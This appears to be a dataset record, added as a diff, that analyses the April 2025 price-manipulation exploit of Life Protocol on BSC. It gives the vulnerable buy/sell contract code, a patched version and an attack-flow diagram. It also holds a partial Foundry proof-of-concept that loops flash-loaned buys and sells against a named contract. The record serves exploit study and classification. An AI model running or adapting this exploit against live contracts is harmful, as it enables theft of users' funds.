@@ -1,0 +1,32 @@
+{
+ "id": "2025__2025-04-28_Lifeprotocol_PriceManipulation",
+ "source_file": "2025/2025-04-28_Lifeprotocol_PriceManipulation.md",
+ "title": "Life Protocol — Price Manipulation via Repeated buy/sell Analysis",
+ "date": "2025-04-28",
+ "protocol": "Life Protocol",
+ "chain": "BSC",
+ "loss_raw": "15,114 BUSD",
+ "loss_usd": null,
+ "root_cause": "The price calculation in the buy/sell functions relies on a manipulable internal spot price",
+ "attack_tx": "0x487fb71e...",
+ "vulnerable_contract": "0x42e2773508e2ae8ff9434bea599812e28449e2cd",
+ "classes": [
+  "oracle-price-manipulation"
+ ],
+ "code_before": [
+  "❌ Vulnerable buy/sell: spot price-based exchange rate\ncontract LifeProtocol {\n    function buy(uint256 lifeTokenAmount) external {\n        //",
+  "❌ Price calculation based on current pool state (manipulable)\n        uint256 busdRequired = lifeTokenAmount * getCurrentPrice();\n        IERC20(BUSD).transferFrom(msg.sender, address(this), busdRequired);\n        IERC20(lifeToken).transfer(msg.sender, lifeTokenAmount);\n        //",
+  "❌ Internal price not immediately updated → favorable for next buy\n    }\n\n    function sell(uint256 amount) external {\n        uint256 busdReturn = amount * getCurrentPrice();\n        IERC20(lifeToken).transferFrom(msg.sender, address(this), amount);\n        IERC20(BUSD).transfer(msg.sender, busdReturn);\n    }\n}\n\n//"
+ ],
+ "code_after": [
+  "✅ Fixed code: slippage protection and cooldown\ncontract LifeProtocol {\n    uint256 public lastTradeBlock;\n\n    function buy(uint256 lifeTokenAmount) external {\n        require(block.number > lastTradeBlock, \"One trade per block\"); //",
+  "✅\n        lastTradeBlock = block.number;\n        // Use AMM-based price calculation\n    }\n}"
+ ],
+ "steps": [
+  "► Sell LIFE → BUSD"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─[1]─► DODO Flash Loan (borrow 110,000 BUSD)\n  │\n  ├─[2]─► Loop 53 times:\n  │         └─► LifeProtocol.buy(1000 BUSD)\n  │               └─► Buy LIFE tokens with 1000 BUSD\n  │               └─► Price increases slightly with each purchase\n  │\n  ├─[3]─► Loop 53 times:\n  │         └─► LifeProtocol.sell(LIFE tokens)\n  │               └─► Sell LIFE → BUSD\n  │               └─► Realize profit from accumulated slippage\n  │\n  ├─[4]─► Repay DODO Flash Loan (110,000 BUSD)\n  │\n  └─[5]─► Net profit: 15,114 BUSD",
+  "contract LifeProtocol_exp is Test {\n    uint256 public quoteAmount = 110000 * 1e18;\n\n    function testExploit() public {\n        // [1] Borrow BUSD via DODO flash loan\n        IFS(dpp).flashLoan(0, quoteAmount, address(this), abi.encodePacked(uint256(1)));\n        console2.log(\"Profit:\", IFS(busd).balanceOf(address(this)) / 1e18, 'BUSD');\n    }\n\n    function DPPFlashLoanCall(\n        address sender,\n        uint256 baseAmount,\n        uint256 quoteAmount,\n        bytes calldata data\n    ) public {\n        // [2] 53 buy cycles\n        for (uint256 i = 0; i < 53; i++) {\n            IFS(LifeProtocolContract).buy(1000 * 1e18);\n            // Internal price shifts slightly with each purchase\n        }\n\n        // [3] 53 sell cycles\n        for (uint256 i = 0; i < 53; i++) {\n            IFS(Life"
+ ]
+}
